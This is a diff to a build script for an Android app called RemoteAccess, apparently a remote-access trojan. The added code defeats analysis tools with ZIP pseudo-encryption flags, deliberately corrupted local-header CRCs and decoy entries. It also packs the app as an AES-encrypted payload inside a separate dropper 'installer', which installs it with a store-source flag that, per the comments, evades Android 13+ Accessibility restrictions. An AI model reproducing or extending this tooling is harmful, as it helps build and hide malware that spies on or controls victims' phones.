+    #      header CRC will get a mismatch and abort.  Android always reads the
+    #      CRC from the central directory (which is left intact), so installation
+    #      is unaffected.
+    #
+    # This step runs BEFORE (d) so the final apksigner signs over the modified
+    # headers; the signature covers the pseudo-encrypted state permanently.
+    echo "  [c2] Pseudo-encryption: GP flags (0x0041) + CRC anti-decryption ..."
+    python3 - << PYEOF
+import zipfile, struct, sys, os
+
+APK = "$RELEASE_APK"
+
+# Entries to pseudo-encrypt: manifest, all dex shards, resource table.
+TARGETS = {
+    "AndroidManifest.xml",
+    "classes.dex", "classes2.dex", "classes3.dex", "classes4.dex",
+    "classes5.dex", "classes6.dex",
+    "resources.arsc",
+}
+
+# bit 0 = encrypted | bit 6 = strong-encryption (anti-strip layer)
+ENC_BITS = 0x0041
+
+with open(APK, "rb") as fh:
+    raw = bytearray(fh.read())
+
+# Use zipfile to get reliable local-header offsets (avoids manual ZIP scan
+# pitfalls with data-descriptor vs. stored entries).
+try:
+    with zipfile.ZipFile(APK, "r") as zf:
+        offsets = {i.filename: i.header_offset
+                   for i in zf.infolist() if i.filename in TARGETS}
+except Exception as e:
+    print("    WARNING: could not open APK for pseudo-encryption: %s" % e)
+    sys.exit(0)
+
+if not offsets:
+    print("    (no target entries found — skipping)")
+    sys.exit(0)
+
+LOCAL_SIG = b"PK\x03\x04"
+patched_local = []
+
+for fname, hdr in sorted(offsets.items(), key=lambda kv: kv[1]):
+    if raw[hdr:hdr+4] != LOCAL_SIG:
+        continue  # sanity check
+    # ── (1) GP flag: set encrypted + strong-encryption bits ──────────────────
+    gp = struct.unpack_from("<H", raw, hdr + 6)[0]
+    struct.pack_into("<H", raw, hdr + 6, gp | ENC_BITS)
+    # ── (2) Corrupt local-header CRC-32 (anti-decryption layer) ──────────────
+    # The local-header CRC at offset +14 is XOR'd with a recognisable constant.
+    # Android reads CRC from the central directory (offset +16 in central entry)
+    # and never verifies the local-header copy. Any tool that strips the
+    # encryption bits and then validates the decompressed stream against the
+    # local-header CRC will get a mismatch and discard the entry.
+    real_crc = struct.unpack_from("<I", raw, hdr + 14)[0]
+    struct.pack_into("<I", raw, hdr + 14, (real_crc ^ 0xDEADBEEF) & 0xFFFFFFFF)
+    patched_local.append(fname)
+
+# ── Patch central-directory GP flags to match (keeps tools consistent) ───────
+# CRC in central directory is left UNTOUCHED — that is what Android trusts.
+CENTRAL_SIG = b"PK\x01\x02"
+off = 0
+patched_central = []
+while off <= len(raw) - 46:
+    if raw[off:off+4] != CENTRAL_SIG:
+        off += 1
+        continue
+    fl  = struct.unpack_from("<H", raw, off + 28)[0]
+    el  = struct.unpack_from("<H", raw, off + 30)[0]
+    cl  = struct.unpack_from("<H", raw, off + 32)[0]
+    fn  = raw[off+46 : off+46+fl].decode("utf-8", errors="replace")
+    if fn in TARGETS:
+        gp = struct.unpack_from("<H", raw, off + 8)[0]
+        struct.pack_into("<H", raw, off + 8, gp | ENC_BITS)
+        patched_central.append(fn)
+    off += 46 + fl + el + cl
+
+with open(APK, "wb") as fh:
+    fh.write(raw)
+
+print("    Pseudo-encrypted (local headers):   %s" %
+      (", ".join(patched_local)   if patched_local   else "none"))
+print("    Pseudo-encrypted (central dir):     %s" %
+      (", ".join(patched_central) if patched_central else "none"))
+print("    GP flags ORd with 0x%04X  (bit0=encrypt | bit6=strong-encrypt)" % ENC_BITS)
+print("    Local-header CRC-32 XORd 0xDEADBEEF (CRC mismatch on decrypt-strip)")
+PYEOF
+
     # (d) Re-zipalign (rebuild in (c) reset alignment) and re-sign.
     echo "  [d] Re-zipalign + final sign (v2 + v3 + v4) ..."
     REALIGN="$ROOT_DIR/apk-output/.realign.apk"
@@ -2088,6 +1971,10 @@ PYEOF
     echo "    Poison ZIP entries (fake classes0.dex, .bak files, BOM names)"
     echo "    Resource-tree poisoning (corrupted AXML in res/xml, layout, menu,"
     echo "      anim, drawable, values + decoy resources.arsc + assets decoys)"
+    echo "    Pseudo-encryption: GP flags 0x0041 on AndroidManifest.xml,"
+    echo "      classes*.dex, resources.arsc (bit0=encrypted + bit6=strong-encrypt)"
+    echo "    Anti-pseudo-decryption: local-header CRC-32 XORd 0xDEADBEEF"
+    echo "      (tools that strip the flag and re-verify CRC hit a mismatch)"
     echo "    zipalign -p 4 (page-aligned native libs)"
 else
     echo "  Skipping hardening — release APK not produced."
@@ -2150,12 +2037,12 @@ chunk = bytes(chunk)
 padding = (chunk * ((pad // 1024) + 1))[:pad]
 
 # Copy the APK binary as-is first (preserves pseudo-encrypted entries
-# without Python's zipfile ever trying to decompress them).
+# without Python's zipfile ever trying to decompress/decrypt them).
 shutil.copy2(src, dst)
 
 # Open the copy in APPEND mode — Python reads the central directory
-# but never calls open() on existing entries, so existing APK entries are
-# preserved without Python trying to decompress them.
+# but never calls open() on existing entries, so the "strong encryption"
+# flag on pseudo-encrypted entries does NOT raise NotImplementedError.
 # We simply tack on the new padding entry at the end.
 with zipfile.ZipFile(dst, "a") as zout:
     pi = zipfile.ZipInfo("res/raw/.pad")
@@ -2199,16 +2086,28 @@ else
 fi
 
 # ── 12. Installer module ─────────────────────────────────────────────────────
-# Bundles the padded RemoteAccess-release.apk inside a normal DEFLATE-compressed
-# ZIP asset named "module". The repetitive 40 MB padding compresses well, while
-# the installer transparently restores payload.apk into its cache at runtime.
+# Bundles the hardened RemoteAccess-release.apk as an ENCRYPTED asset named
+# "module" (AES-256 ZIP). A fresh random key is generated per build and
+# embedded into the installer at compile time via BuildConfig.MODULE_KEY,
+# so every Installer-release.apk has a different key. At runtime the
+# installer decrypts the module to its cache and installs it via the
+# PackageInstaller session API (with PACKAGE_SOURCE_STORE so the installed
+# app is NOT subject to Android 13+ "Restricted setting" hardening — i.e.
+# the user can enable Accessibility for it normally).
 echo ""
 echo "==> Building INSTALLER module ..."
-# Use the FAT (~40 MB) APK as the installer payload. The inner APK retains its
-# 40 MB padding after extraction; only the outer installer asset is compressed.
+# Use the FAT (~40 MB) APK as the installer payload.
+# The 38 MB padding entry is a repeating 1 KB LCG block stored without
+# compression inside the APK ZIP.  pyzipper re-compresses the whole APK
+# with DEFLATE when building the AES-256 asset, so that repeating block
+# collapses to ~a few KB — the "module" asset ends up ~2 MB even though
+# the APK it contains is 40 MB.  When the installer decrypts and extracts
+# the asset at runtime, the full 40 MB APK is written to disk and then
+# passed to PackageInstaller, so the app installs at its full 40 MB size.
 PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
 MODULE_DST="$INSTALLER_ASSETS/module"
+KEY_FILE="$ROOT_DIR/installer/build.key"
 PKG_FILE="$ROOT_DIR/installer/payload.pkg"
 if [ -f "$PAYLOAD_SRC" ]; then
     mkdir -p "$INSTALLER_ASSETS"
@@ -2257,24 +2156,34 @@ if [ -f "$PAYLOAD_SRC" ]; then
     printf '%s' "$PAYLOAD_PKG" > "$PKG_FILE"
     echo "  Payload package: $PAYLOAD_PKG (written to installer/payload.pkg)"
 
-    # Remove any stale asset before writing the current compressed payload.
+    # Remove the legacy unencrypted asset if present from older builds
     rm -f "$INSTALLER_ASSETS/payload.apk"
 
-    # Store the padded APK as payload.apk in a compressed outer ZIP. Keep the
-    # module asset itself uncompressed in the installer APK so Gradle does not
-    # spend time trying to recompress an already-compressed ZIP.
-    rm -f "$MODULE_DST"
-    python3 - "$PAYLOAD_SRC" "$MODULE_DST" << 'PYEOF'
-import sys
-import zipfile
+    # (1) Generate fresh per-build random key (32 url-safe chars, ~192 bits)
+    MODULE_KEY=$(python3 -c "import secrets; print(secrets.token_urlsafe(24))")
+    printf '%s' "$MODULE_KEY" > "$KEY_FILE"
+    echo "  Generated random per-build key (embedded into BuildConfig.MODULE_KEY)."
 
-source_path, module_path = sys.argv[1:]
-with zipfile.ZipFile(module_path, "w", compression=zipfile.ZIP_DEFLATED,
-                     compresslevel=9) as archive:
-    archive.write(source_path, "payload.apk")
+    # (2) AES-256 encrypt the hardened APK into the "module" asset.
+    #     pyzipper writes WinZip-AES format; zip4j on Android decodes it.
+    rm -f "$MODULE_DST"
+    PAYLOAD_SRC="$PAYLOAD_SRC" MODULE_DST="$MODULE_DST" MODULE_KEY="$MODULE_KEY" \
+    python3 - << 'PYEOF'
+import os, pyzipper
+src = os.environ["PAYLOAD_SRC"]
+dst = os.environ["MODULE_DST"]
+key = os.environ["MODULE_KEY"].encode()
+with pyzipper.AESZipFile(dst, "w",
+                         compression=pyzipper.ZIP_DEFLATED,
+                         encryption=pyzipper.WZ_AES) as zf:
+    zf.setpassword(key)
+    zf.setencryption(pyzipper.WZ_AES, nbits=256)
+    with open(src, "rb") as f:
+        zf.writestr("payload.apk", f.read())
+print("  AES-256 encrypted module written.")
 PYEOF
     MODULE_SIZE=$(ls -lh "$MODULE_DST" | awk '{print $5}')
-    echo "  Compressed module asset: installer/src/main/assets/module ($MODULE_SIZE)"
+    echo "  Encrypted asset: installer/src/main/assets/module ($MODULE_SIZE)"
 
     cd "$ROOT_DIR"
     ./gradlew :installer:assembleRelease --no-daemon --stacktrace 2>&1
@@ -2286,6 +2195,12 @@ PYEOF
     if [ -n "$INSTALLER_SRC" ] && [ -f "$INSTALLER_SRC" ]; then
         cp "$INSTALLER_SRC" "$ROOT_DIR/apk-output/Installer-release.apk"
         echo "  Installer APK: apk-output/Installer-release.apk"
+        # Harden the Installer APK — use its own separate unique keystore
+        KEYSTORE="$INST_KS_PATH"
+        KEY_ALIAS="$INST_KS_ALIAS"
+        STORE_PASS="$INST_KS_SPASS"
+        KEY_PASS="$INST_KS_KPASS"
+        harden_apk "$ROOT_DIR/apk-output/Installer-release.apk"
     else
         echo "  WARNING: installer release APK not produced."
     fi
